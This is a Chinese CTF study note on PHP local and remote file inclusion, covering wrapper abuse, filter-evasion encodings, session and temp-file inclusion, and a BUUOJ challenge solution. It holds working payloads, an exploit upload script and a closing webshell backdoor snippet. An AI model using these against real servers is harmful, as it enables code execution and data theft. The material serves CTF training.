---
title: "ctf文件包含"
date: "2026-10-18"
categories: ["文件包含","ctf"]
tags: ["文件包含","CTF"]
description: "LFI:本地文件包含漏洞(Local File Inclusion)"
author: "Fan-SecLab"
aside: right
outline: [2, 3]
---

# 文件包含解题思路

> 🎯 本文按「文件包含相关函数 → 文件包含原理 → php伪协议 → php://input： → php://filter： → data://： → 例1 → 绕过」的顺序整理，便于对照速查。

## 文件包含相关函数

```
include()：遇到错误生成警告，继续执行脚本
require()：遇到错误生成致命错误，脚本继续
include_once()：如果文件已包含，则不再进行包含，一定程度避免错误
require_once()：如果文件已包含，则不再进行包含，一定程度避免错误
fopen()，file_get_contents()等：文件读取函数
```

## 文件包含原理

**LFI:本地文件包含漏洞(Local File Inclusion)**

**原理**：通过用户可控的参数，将服务器本地文件路径传入包含函数，从而读取或执行该文件内容。

**前提**

> 代码中存在 `include/require` 等函数且参数用户可控无需开启 `allow_url_include`

```
本地文件包含可以做什么
包含同目录下的文件
获取web目录或者其他配置文件
包含上传的附件:?file=../attachment/media/xxx.file
●包含/读取session文件:?file=../../.././../../tmp/sess tnrdo9ub2tsdurntvOpdir1no7
读取phpinfo可以包含临时文件
```

---

**RFI：远程文件包含(Remote File Inclusion)**

**原理**：将文件路径替换为远程 URL，服务器会请求并执行远程服务器上的恶意代码。

**前提**：

> `allow_url_include = on`
>
> `magic_quotes_gpc = off`
>
> 直接把文件路径改成具体的 URL 即可

```
远程代码执行:
?file=[http|https ftp]://example.com/shell.txt(需要allow_url_fopen=On并目
allow_url_include=On)
利用php流input:
?file=php://input(需要allow_url_include=On)
```

## php伪协议

PHP 伪协议允许开发者通过指定不同的输入源来读取、处理和引入数据，这一特性在文件包含漏洞（如include 或 require）中被滥用，导致攻击者能够通过伪协议来读取敏感数据或执行恶意代码。

测试代码

```php
<?php
$data = $_GET['data'];
if (isset($data) && $data !== '') {
echo "Received: $data\n";
echo file_get_contents($data);
} else {
echo "No data received from data";
}
?>
```

![image-20261018234711010](/assets/images/file-include/image-20261018234711010.png)

![image-20261019223101441](/assets/images/file-include/image-20261019223101441.png)

### php://input：

**作用**：读取HTTP POST请求里原始的请求体（body）数据，这个可以绕过 GET 传参。

**用法：**

```bash
?file=php://input+post包

curl -X POST -P "content-type: text/plain" -d "flag{1234567}" 127.0.0.1:10086/test3.php
```

**实例：**

```bash
curl -X POST -H "Content-Type: text/plain" -d "flag{1234567}" http://127.0.0.1/test.php?data=php://input
```

![image-20261019223643488](/assets/images/file-include/image-20261019223643488.png)**分析：**

```
curl ：Windows/Linux命令行工具，用来发送HTTP请求。

-X POST ：指定请求方法为 POST （默认curl是GET）。

-H "Content-Type: text/plain" ：添加HTTP请求头，告诉服务器：POST的数据是纯文本。

-d "flag{1234567}" ： -d  = data，POST请求体（body），这里携带的内容： flag{1234567} 。

http://127.0.0.1:10086/test.php ：访问的靶场PHP页面。

?data=php://input ：GET传参， data 参数的值是 php://input 伪协议。

GET参数 data=php://input  →  $data = "php://input"  →  读取HTTP POST请求里原始的请求体（body）数据 flag{1234567}

file_get_contents("php://input") ：读取本次POST请求的body内容，也就是  -d  后面的 flag{1234567}
```

也可以用burp抓包进行修改

![image-20261019225227401](/assets/images/file-include/image-20261019225227401.png)

如果是 `include()  /  include_once()  /  require()  /  require_once()`,那么就会生成`phpinfo`的信息界面。

这个还可以绕过 GET 传参。

### php://filter：

**作用:**

通过 php://filter 伪协议，攻击者可以将目标文件的内容以编码的形式返回，这使得攻击者可以读取敏感文件的内容（如配置文件）。

**用法：**

```
?file=php://filter/[参数+过滤器]/resource=[target_file]
```

**实例：**

```
http://127.0.0.1/test.php?data=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261019230958691](/assets/images/file-include/image-20261019230958691.png)

```php
base64编码：
PD9waHANCiRmbGFnPSJmbGFne3RoaXNfaXNfdGhlX2ZsYWd9IjsNCmVjaG8gJGZsYWc7DQo/Pg==

解码：
<?php
$flag="flag{this_is_the_flag}";
echo $flag;
?>
```

### data://：

**作用：**

攻击者可以使用 data:// 伪协议注入任意代码并执行。

**用法：**

```php
data://text/plain,xxx，这个xxx一般跟php命令

data://text/plain,<?php system('ls'); ?>	#让 PHP 执行 ls 命令。
```

## 例1

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
/*flag in flag.php*/
if (!isset($_POST['abc']))
die('i am abc, post it damn you');
if (strpos($_POST['abc'],"http"))
die('fxck ur rfl out of shit');
if (strpos($_POST['abc'],"hello123"))
die('i am abc! you fxcking hacker');
if (file_get_contents($_POST['abc']) != 'hello123')
die('file get contents! FILE! GET! CONTENTS!');
include($_POST['file']);
?>
```

**代码分析：**

```php
if (!isset($_POST['abc']))
die('i am abc, post it damn you');
如果没有用 post 传入一个abc参数，那么程序结束
```

```php
if (strpos($_POST['abc'],"http"))
die('fxck ur rfl out of shit');

strpos() 函数查找字符串在另一字符串中第一次出现的位置。
```

![image-20261019235152034](/assets/images/file-include/image-20261019235152034.png)

![image-20261019235915515](/assets/images/file-include/image-20261019235915515.png)

http的起始索引数字是5

![image-20261020000252707](/assets/images/file-include/image-20261020000252707.png)

若只有 http 他本身，那么返回 0 ，可以绕过

**解题思路：**

```
1.必须POST提交参数  abc （ $_POST['abc'] 存在）

2.$_POST['abc']  里面不能包含字符串 http （防止远程文件包含RFL）

3.$_POST['abc']  里面不能包含字符串 hello123 （不能直接写hello123,下一关 file_get_contents($_POST['abc']) 会把 hello123 当成文件名去读取本地文件,题目已将告诉你flag在flag.php中）

4.file_get_contents($_POST['abc'])  读取出来的内容必须等于  hello123

```

5. 全部通过后： include($_POST['file']) ，file参数可控 → 文件包含漏洞，可以执行PHP代码

```bash

**核心难点：**

```
 $_POST['abc'] 这个变量本身不能含有hello123，但是 file_get_contents($_POST['abc']) 读出来的内容必须是hello123。

 所以 abc 的值要填伪协议/文件路径，这个伪协议读取出来的内容是hello123。

 可以利用 data://为协议，因为他后面不是可以执行php代码吗，我们就把hello1234，可以经过一系列的加工，反正最后解码结果是这个就可以
 ```

**payload**

 ```

?abc=data://text/plain;base64,aGVsbG8xMjM=&file=php://filter/convert.base64-
encode/resource=flag.php

```

```

逐段校验这条POST请求

1.  abc=data://text/plain;base64,aGVsbG8xMjM=

- data://  #伪协议
- base64,aGVsbG8xMjM=	#把后面这串aGVsbG8xMjM=自动 base64 解码，得到原始文本hello123
- $_POST['abc']  的字符串： data://text/plain;base64,aGVsbG8xMjM=
- 不包含 http
- 不包含明文 hello123
- file_get_contents() 解析data伪协议，读出 hello123 ，满足相等判断

2.  file=php://filter/convert.base64-encode/resource=flag.php
校验全部通过后，执行 include()

- php://filter 读取 flag.php 文件内容
- convert.base64-encode ：读取源码之后进行base64编码输出，防止PHP标签被服务器解析，直接拿到源码字符串
- 最后进行解码就行

## 绕过

**原始payload：**

```
file=php://filter/read=convert.base64-encode/resource=1.php
```

### read绕过

1. 直接删除 read=

   ```
   ?f=php://filter/convert.base64-encode/resource=login.php

   ```

2. 把 read 进行url编码

```
?file=php://filter/%72%65%61%64=convert.base64-encode/resource=1.php
```

### resource绕过

1. 进行url编码

```
?f=php://filter/convert.base64-encode/%72%65%73%6f%75%72%63%65=login.php
```

> **其实payload上任意字符串都可以进行url编码，仍能执行成功。**
>
> **`convert.base64-encode`，`resource`这些地方可以尝试二次编码，这个需要尝试，不能百分百成功。**

### 路径穿越符绕过

#### ..\ 绕过

1. url编码

   ```
   %2e%2e%2f
   ```

2. url2次编码

   ```
   %252e%252e%252f
   
   ```

#### ..\ 绕过

1. url编码

   ```
   %2e%2e%5c

   ```

2. url2次编码

   ```
   %252e%252e%255c
   
   ```

#### UTF-8超长编码绕过（Overlong Encoding / 非最短编码,部分浏览器支持）

```
%C0%AF  是 / 超长编码

%C0%AE  是 . 的超长编码

%C1%9C 是 \ 的超长编码

../
%C0%AE%C0%AE%C0%AF

..\
%C0%AE%C0%AE%C1%9C
```

## 例2

```php
<?php
if(isset($_GET['page'])){
$page = $_GET['page'];
$filter =
"/\.\.|base|file|gopher|http|ftp|phar|base|string|data|zip|compress|decode|read|pear|rot|crypt|utf/i";
if (preg_match($filter,$page)){
die("hacker");
}
include $page;
}
?>
```

**分析**

这里用正则匹配，如果出现了下面这些字符串，不论大小写，直接执行hacker

```
..|base|file|gopher|http|ftp|phar|base|string|data|zip|compress|decode|read|pear|rot|crypt|utf
```

所以我们要用上面没有的字符串，或者用绕过的方式去写

### 方法1：

没加工的payload:

```
?page=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261020231711713](/assets/images/file-include/image-20261020231711713.png)

read,base64被绕过
我们可以直接删去 read= ，然后把base64进行 url 编码，一次编码不行，我们就编码2次就出来了

```
?page=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=flag.php
```

![image-20261020231908164](/assets/images/file-include/image-20261020231908164.png)

```
base64编码：
PD9waHANCiRmbGFnPSJmbGFne3RoaXNfaXNfdGhlX2ZsYWd9IjsNCmVjaG8gJGZsYWc7DQo/Pg==
```

```php
解码：
<?php
$flag="flag{this_is_the_flag}";
echo $flag;
?>
```

## session包含

**什么是Session**

1. PHP 默认 session.save_handler = files，这是php.ini 里的配置项，Session 数据以文件形式存在服务器磁盘，存储目录：session.save_path 控制（默认大多是系统临时目录，如 /tmp）
2. 文件名：sess_ + SessionID，例：sess_uifiqp9gtsqighhg9flalmr5b3
3. 文件内容：序列化后的 $_SESSION 数组数据（PHP 内置序列化格式，不是 serialize() 函数那种完全一样，是 session 专用序列化）
4. _SessionID：放在客户端 Cookie（默认 PHPSESSID），浏览器每次请求带上这个 ID，PHP 去服务器找对应sess_xxx文件，读取并反序列化得到$_SESSION。

**常见session存储路径 **

```
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
C:\Users\用户名\AppData\Local\Temp\sess_jaden
```

**利用前提**

1. 代码里执行了 session_start() (会创建 session)
2. PHP 使用files方式存储 session（session.save_handler=files）(php.ini 里的配置项)
3. 知道 session 文件物理路径（session.save_path）
4. 存在文件包含漏洞（?file=xxx）
5. 可控写入 session 文件内容（把 PHP 代码写进 session 里）

## 例3

```php
//test3.php,文件包含漏洞
<?php
$file = $_GET['file'];
include($file);
?>
```

![image-20261021102452963](/assets/images/file-include/image-20261021102452963.png)

```php
//include4.php，生成session文件
<?php
session_start();
if(isset($_GET['a'])){
$a= $_GET['a'];
$_SESSION["username"]= $a;	//把变量 $a 的值，存入 Session 数组里，键名叫 username
}
var_dump($_SESSION);
?>
```

![image-20261021102740018](/assets/images/file-include/image-20261021102740018.png)

我们用 Cookie Editor 去查看 cookie

```
5ddk0pnhm9guncodq6hj0mjcgv
```

windows 生成的 cookie 文件生成在

```
C:\Users\用户名\AppData\Local\Temp\sess_5ddk0pnhm9guncodq6hj0mjcgv
```

![image-20261021103220990](/assets/images/file-include/image-20261021103220990.png)

数据被成功写入

然后我们结合文件包含漏洞，就可以造成攻击

```
http://www.111.com/test3.php?file=C:\Users\24924\AppData\Local\Temp\sess_5ddk0pnhm9guncodq6hj0mjcgv
```

![image-20261021103453945](/assets/images/file-include/image-20261021103453945.png)

如果你觉得文件名太长，你也可以自己去命名

![image-20261021103600129](/assets/images/file-include/image-20261021103600129.png)

![image-20261021103806544](/assets/images/file-include/image-20261021103806544.png)

## 会话上传进度

### 介绍

> 该特性自 PHP 5.4.0 版本起可用。

当开启 `session.upload_progress.enabled` 配置项时，PHP 就可以跟踪各个正在上传的文件的上传进度。这份信息对于上传请求本身并没有太大用处，但在文件上传过程中，应用程序可以（例如通过 XHR）向另一个接口发送 POST 请求，以此查询上传状态。

上传进行期间，上传进度信息会存放到超全局变量 `$_SESSION` 中

**触发条件是**：请求必须是 multipart/form-data 的 POST，正在进行文件上传，并且携带一个字段名与 session.upload_progress.name 完全相同的表单字段（默认PHP_SESSION_UPLOAD_PROGRESS）。PHP 检测到这类请求后，会在 $_SESSION 中填充一个数组数组索引由配置项 `session.upload_progress.prefix` 与 `session.upload_progress.name` 的值拼接而成。

![image-20261021203721545](/assets/images/file-include/image-20261021203721545.png)

### 相关参数

```ini
session.auto_start //开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()，默认关闭。

session.upload_progress.cleanup = on //表示当文件上传结束后，php将会立即清空对应session文件中的内容。该选项默认开启。我们需要把它关掉。

session.use_strict_mode //默认情况下，该选项的值是0，此时用户可以自己定义SessionID。

session.upload_progress.name  //表单里隐藏 input 的 name 属性名
session.upload_progress.prefix //固定前缀字符串，默认 upload_progress_
//$_SESSION 里存放上传进度那条数组的键名 = prefix 拼接上表单里提交的 name 变量的值

session.upload_progress.enabled //默认是开启的，激活功能
```

### 演示

```html
//include3.html
<!DOCTYPE html>
<html>
<body>
<form action="include3.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123">
//表单的名字必须和 session.upload_progress.name 一致
<input type="file" name="file">
<input type="submit" value="submit"></form>
</body>
</html>
```

```php
//include3.php
<?php
session_start();
var_dump($_SESSION);
?>
```

```php
//flag.php
<?php
$flag="flag{this_is_the_flag}";
echo $flag;
phpinfo();
?>
```

```php
//test3.php
<?php
$file = $_GET['file'];
include($file);
?>
```

我们在include3.html上上传flag.php

![image-20261021210421792](/assets/images/file-include/image-20261021210421792.png)

```
cookie的值
moe7ci9bg4r3f80hbs1s2jukbd
```

生成了cookie文件

![image-20261021210937853](/assets/images/file-include/image-20261021210937853.png)

session的数据如下

```php
array(1) {
  ["upload_progress_123"]=> array(5) {
      // $_SESSION 数组的键,拼接公式:session.upload_progress.prefix（默认字符串：upload_progress_） + 隐藏表单的value（123）
    ["start_time"]=> int(1792587804)                // 上传请求开始时间戳
    ["content_length"]=> int(380)                   // 本次POST请求总字节大小：380字节
    ["bytes_processed"]=> int(380)                  // 已经接收处理字节：380字节
    ["done"]=> bool(true)                           // 整个POST请求已经全部接收完毕
    ["files"]=> array(1) {
      [0]=> array(7) {
        ["field_name"]=> string(4) "file"           // 表单文件域name="file"
        ["name"]=> string(8) "flag.php"             // 客户端上传文件名：flag.php
        ["tmp_name"]=> string(45) "C:\Users\24924\AppData\Local\Temp\php83EC.tmp" // 服务器临时文件路径
        ["error"]=> int(0)                          // 上传错误码：0=无错误，上传成功
        ["done"]=> bool(true)                       // 这个文件上传完成
        ["start_time"]=> int(1792587804)            // 该文件开始上传时间戳
        ["bytes_processed"]=> int(67)               // 这个文件本身大小67字节
      }
    }
  }
}
```

然后我们去用 test3.php 的文件包含漏洞去包含这个文件，var_dump($_SESSION);打印 session 内存数组

![image-20261021212347779](/assets/images/file-include/image-20261021212347779.png)

我们用bp抓包去修改数据包，实现文件包含

我们需要在 123 下面写上攻击代码，然后还要手动加一个 cookie

![image-20261021212954458](/assets/images/file-include/image-20261021212954458.png)

```
http://172.20.9.138/test3.php?file=C:\Users\24924\AppData\Local\Temp\sess_jaden9
```

![image-20261021213406484](/assets/images/file-include/image-20261021213406484.png)

两种都是session包含,但往session文件中写入数据的方式不同,一个是通过传参直接写进文件中,一个是通过文件上传,把文件上传内容写入session文件中。

## 临时文件包含

目前，常见的两种临时文件包含漏洞利用方法主要是：通过读取PHPINFO() 上的敏感信息和利用PHP7 Segment Fault的段错误，这两种方法可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。

### PHP文件上传临时文件机制

1. 浏览器以 multipart/form-data 方式 POST 上传文件。
2. PHP内核优先接收文件数据，自动在系统tmp目录生成临时文件 /tmp/phpXXXXXX。
3. 临时文件内容 = 你上传的原文件内容，原样保存，不解析、不执行。
4. PHP将临时文件路径、文件名、大小、类型存入超全局变量  $_FILES 。
5. 开发者代码进行校验（后缀、类型、大小），合法则使用  move_uploaded_file()  移动到网站目录。
6. 请求正常结束 → PHP自动销毁、删除临时文件。

### 为什么需要生成临时文件

1. 网络数据是分片传输的，不能直接交给代码
文件是一块块数据包发过来的，PHP脚本不能一边收包一边处理，必须全部接收完、落地成完整文件，脚本才能操作。
2. 安全隔离机制（设计初衷）
临时文件存放在 系统临时目录 /tmp，不在网站根目录，用户无法通过URL直接访问执行。
强制开发者必须手动  move  迁移，多一层安全校验关卡，防止任意文件直接落地webshell。
3. 防止脚本超时、网络异常导致文件损坏
先落盘缓存，无论中途是否卡顿、延迟，最终给到代码的一定是完整文件。
4. 统一生命周期管理
PHP内核全权管理临时文件：脚本跑完自动删，无需程序员手动清理垃圾文件。

### 全局变量

在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。

$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。

```ini
$_FILES['userfile']['name'] 客户端文件的原名称。
$_FILES['userfile']['type'] 文件的 MIME 类型，如果浏览器提供该信息的支持，例
如"image/gif"。
$_FILES['userfile']['size'] 已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以
在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
$_FILES['userfile']['error'] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
```

在临时文件包含漏洞中 `$_FILES['userfile']['name'] `这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。

### 存储目录

文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的 upload_tmp_dir 属性指定，假如 upload_tmp_dir 的路径不可写，PHP会上传到系统默认的临时目录中。

不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。

```
//linux
/tmp
//windows
C:/Windows/
C:/Windows/Temp/
```

### 命名规则

存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。

```
临时文件格式
php + 6 位字母数字，如 phpA1b2C3
```

### php7 Segment Fault (段错误)

php代码中使用php://filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。

使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。

```
?file=php://filter/string.strip_tags/resource=/etc/passwd
```

> php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复
>
> php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
>
> php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复

## 例4

**ctf-[NPUCTF2020]ezinclude**

查看源代码

需要$seceret.$name=&pass

$secret ：后端源码里写死的固定字符串（密钥），我们前端看不到原文

所以只需要我们去找$name

我们抓包，然后get传参一个?name=1，2，3,发现响应包中每一个数字对应一个hash值

这个hash值可能就是pass

然后我们get传参 ?name=1&pass=hash值

然后会提示一个 flflflflag.php

然后我们访问这个文件

出现了一个文件包含的接口

include($_GET[“file“]);

并且php的版本是7.0.33

我们就可以利用文件上传，产生段错误，生成一个临时文件

py脚本：

```python
import requests
from io import BytesIO
payload = "<?php phpinfo()?>"
file_data = { 'file': BytesIO(payload.encode()) }
url = "http://cf32bb01-719c-4093-a0f4-
0748ec7da371.node5.buuoj.cn:81//flflflflag.php?
file=php://filter/string.strip_tags/resource=/etc/passwd"
r = requests.post(url=url, files=file_data, allow_redirects=False)
```

模拟上传一个 post 表单，上传一个文件，文件内容是 `<?php phpinfo()?>`  ,并且造成段错误，不删除临时文件

此时浏览器页面显示 **502 Bad Gateway**

这个py脚本和下面这个post表单功能相同

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://xxx/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="submit">
</form>
</body>
</html>
```

我们需要把他保存为html，浏览器打开，自己本地新建一个  shell.txt ，内容写 `<?php phpinfo();?>` ，点击选择文件，选中这个shell.txt，提交表单。

上传完文件之后，我们并不知道上传的路径，和命名的方法，需要我们去找phpinfo文件。

找不到，然后我们就用dirsearch去寻找有用的文件， 找到一个dir.php,里面有一个文件名 phpYmfjz,和那个临时文件名很像，然后我们去那个文件包含漏洞的页面去包含这个文件，包含成功了，发现就是我们之前上传构造的phpinfo文件，flag就在phpinfo中。

## . **条件竞争**

上传文件之后，生成session文件，记录上传文件信息，上传完毕之后自动删除session，我们需要在文件删除之前疯狂访问这个文件，就是打一个时间差，这个和网速有关不好实现

## **自包含**

自己包含自己，造成死循环，脚本会一直运行，不会结束

我们需要能够访问phpinfo文件，为了读取到临时文件的保存路径以及命名，否则无法包含临时文件。

## 例5

```html
//include6.html
<!DOCTYPE html>
<html>
<body>
<form action="http://127.0.0.1/include6.php?page=include6.php&info" method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="submit"></form>
</body>
</html>
```

```php
//include6.php
<?php
error_reporting(0);
if(isset($_GET['info'])){
phpinfo();
}else{
highlight_file(__FILE__);
}
if(isset($_GET['page'])){
$page='C:\phpstudy_pro\WWW\\'.$_GET['page'];
include $page;
}
```

我们访问 include6.php ，用GET传参，形成自包含

```
?page=include6.php&info
```

页面一直在转圈，说明文件一直没有包含完，那么如果我们在GET传参的时候上传文件，那么所生成的临时文件也就不会被删除

![image-20261023231531293](/assets/images/file-include/image-20261023231531293.png)

然后我们需要用 include6.html post 表单上传一个文件，内容是

```php
<?php echo 123; phpinfo();?>
```

上传成功之后，我们在phpinfo配置文件中去寻找 tmp_name 临时文件的路径

![image-20261023232119716](/assets/images/file-include/image-20261023232119716.png)

```
C:\Users\24924\AppData\Local\Temp\phpCC9.tmp
```

![image-20261023232227951](/assets/images/file-include/image-20261023232227951.png)

然后再用 include6.php 里面的文件包含这个文件。

自包含流程：

1. PHP接收multipart上传 → 生成临时文件  C:\Windows\Temp\phpXXXX （Windows版！只有低16位，总数仅 65535 种，非常适合爆破，不是linux那种6位62字符）

2. 脚本执行： isset($_GET['info'])  → phpinfo()

3.  isset($_GET['page'])  → 拼接  C:\phpstudy_pro\WWW\include6.php  → include 自己

4. 再次进入脚本，GET参数仍然存在，继续phpinfo + 再次include自己

5. 不断递归嵌套，最终栈溢出，PHP进程异常终止，正常请求结束的清理函数没有执行 → 上传临时文件永久保留！

补充：

```php
在临时文件目录下留后门
<?php
file_put_contents('/tmp/shell.php', '<?php exxx($_POST[0]);?>');
?>

<?php @exxx($_POST[0]);echo 123?>
```
